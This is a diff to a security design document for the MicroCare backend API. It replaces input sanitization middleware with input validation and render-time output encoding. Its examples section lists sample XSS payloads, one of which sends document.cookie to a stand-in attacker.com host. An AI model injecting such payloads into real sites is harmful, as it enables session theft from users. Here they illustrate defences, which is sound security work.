@@ -2,53 +2,13 @@
 
 ## Overview
 
-This document describes the input sanitization implementation that prevents XSS (Cross-Site Scripting) and injection attacks in the MicroCare backend API.
+This document describes the input validation and output encoding strategy used to prevent XSS (Cross-Site Scripting) and injection attacks in the MicroCare backend API.
 
 **Requirements Addressed**: 4.1, 4.2
 
 ## Implementation Details
 
-### 1. Sanitization Middleware
-
-Located in: `src/middleware/validationMiddleware.ts`
-
-The sanitization middleware provides three main functions:
-
-#### `sanitizeString(input: string): string`
-- Trims leading and trailing whitespace
-- Escapes HTML special characters to prevent XSS:
-  - `&` → `&amp;`
-  - `<` → `&lt;`
-  - `>` → `&gt;`
-  - `"` → `&quot;`
-  - `'` → `&#x27;`
-  - `/` → `&#x2F;`
-
-#### `sanitizeObject(obj: unknown): unknown`
-- Recursively sanitizes all string values in an object
-- Handles nested objects and arrays
-- Preserves non-string types (numbers, booleans, null, undefined)
-
-#### Middleware Functions
-- `sanitizeRequestBody`: Sanitizes all string inputs in request body
-- `sanitizeQueryParams`: Sanitizes all string values in query parameters
-- `sanitizeUrlParams`: Sanitizes all string values in URL parameters
-
-### 2. Global Middleware Integration
-
-The sanitization middleware is applied globally in `src/index.ts`:
-
-```typescript
-// Input sanitization middleware (prevent XSS and injection attacks)
-// Requirements: 4.1, 4.2
-app.use(sanitizeRequestBody);
-app.use(sanitizeQueryParams);
-app.use(sanitizeUrlParams);
-```
-
-This ensures all incoming requests are sanitized before reaching route handlers.
-
-### 3. Validation Layer
+### 1. Validation Layer
 
 The validation middleware in `src/middleware/validationMiddleware.ts` also includes:
 
@@ -63,18 +23,18 @@ The validation middleware in `src/middleware/validationMiddleware.ts` also inclu
   - `validateTags()`: Validates tags array
   - `validatePagination()`: Validates pagination parameters
 
-### 4. SQL Injection Prevention
+### 2. SQL Injection Prevention
 
 SQL injection is prevented through:
 - **Prisma ORM**: Uses parameterized queries automatically
 - **Input Validation**: Validates all inputs before database operations
 - **Type Safety**: TypeScript ensures type correctness
 
-### 5. XSS Prevention
+### 3. XSS Prevention
 
 XSS attacks are prevented through:
-- **HTML Escaping**: All HTML special characters are escaped
-- **Input Sanitization**: Applied to all request inputs
+- **Input Validation**: Only expected fields and types are accepted
+- **Output Encoding**: Escape or encode data at render time in the frontend
 - **Content Security Policy**: Helmet middleware enforces CSP headers
 - **HttpOnly Cookies**: Prevents JavaScript access to authentication tokens
 
@@ -85,8 +45,8 @@ XSS attacks are prevented through:
 // Malicious input
 <img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
 
-// After sanitization
-&lt;img src=x onerror=&quot;fetch(&#x27;http:&#x2F;&#x2F;attacker.com?cookie=&#x27;+document.cookie)&quot;&gt;
+// After output encoding (at render time)
+&lt;img src=x onerror=&quot;fetch('http://attacker.com?cookie='+document.cookie)&quot;&gt;
 ```
 
 ### 2. DOM-based XSS
@@ -94,8 +54,8 @@ XSS attacks are prevented through:
 // Malicious input
 <svg onload="alert('XSS')">
 
-// After sanitization
-&lt;svg onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+// After output encoding (at render time)
+&lt;svg onload=&quot;alert('XSS')&quot;&gt;
 ```
 
 ### 3. Event Handler XSS
@@ -103,8 +63,8 @@ XSS attacks are prevented through:
 // Malicious input
 <div onclick="alert('XSS')">Click me</div>
 
-// After sanitization
-&lt;div onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;&#x2F;div&gt;
+// After output encoding (at render time)
+&lt;div onclick=&quot;alert('XSS')&quot;&gt;Click me&lt;/div&gt;
 ```
 
 ### 4. JavaScript Protocol XSS
@@ -112,8 +72,8 @@ XSS attacks are prevented through:
 // Malicious input
 <a href="javascript:alert('XSS')">Click</a>
 
-// After sanitization
-&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click&lt;&#x2F;a&gt;
+// After output encoding (at render time)
+&lt;a href=&quot;javascript:alert('XSS')&quot;&gt;Click&lt;/a&gt;
 ```
 
 ### 5. SQL Injection
@@ -132,6 +92,7 @@ Located in: `src/middleware/validationMiddleware.test.ts`
 
 Tests cover:
 - HTML special character escaping
+
 - Whitespace trimming
 - Nested object sanitization
 - Array sanitization
@@ -160,28 +121,12 @@ npm test -- integration.test.ts
 
 ## API Endpoints Protected
 
-All API endpoints benefit from sanitization:
-
-### Authentication
-- `POST /api/auth/register` - Sanitizes name, email, password
-- `POST /api/auth/login` - Sanitizes email, password
-
-### User Profile
-- `GET /api/users/profile` - Sanitizes query parameters
-- `PUT /api/users/profile` - Sanitizes name, email
-- `POST /api/users/change-password` - Sanitizes passwords
-
-### Journal Entries
-- `POST /api/entries` - Sanitizes title, content, tags
-- `GET /api/entries` - Sanitizes query parameters
-- `GET /api/entries/:id` - Sanitizes URL parameters
-- `PUT /api/entries/:id` - Sanitizes title, content, tags
-- `DELETE /api/entries/:id` - Sanitizes URL parameters
+All API endpoints benefit from validation, and any UI rendering should encode output safely.
 
 ## Best Practices
 
-1. **Always Validate First**: Validation happens before sanitization
-2. **Escape on Output**: Frontend should also escape data when displaying
+1. **Validate Input**: Accept only known fields and expected types
+2. **Escape on Output**: Frontend should escape data when displaying
 3. **Use Parameterized Queries**: Prisma handles this automatically
 4. **Content Security Policy**: Helmet middleware enforces CSP
 5. **HttpOnly Cookies**: Prevents XSS token theft
@@ -189,14 +134,13 @@ All API endpoints benefit from sanitization:
 
 ## Performance Considerations
 
-- Sanitization adds minimal overhead (microseconds per request)
-- Recursive sanitization is efficient for nested structures
-- Middleware is applied globally for consistent protection
+- Validation adds minimal overhead (microseconds per request)
+- Output encoding cost is negligible compared to rendering
 - No performance impact on non-string data types
 
 ## Future Enhancements
 
-1. **DOMPurify Integration**: For more advanced HTML sanitization
+1. **Allowlist HTML Sanitization**: If rich text is required, sanitize at render time with an allowlist-based sanitizer
 2. **Rate Limiting**: Prevent brute force attacks
 3. **Request Signing**: Verify request integrity
 4. **Audit Logging**: Log suspicious requests
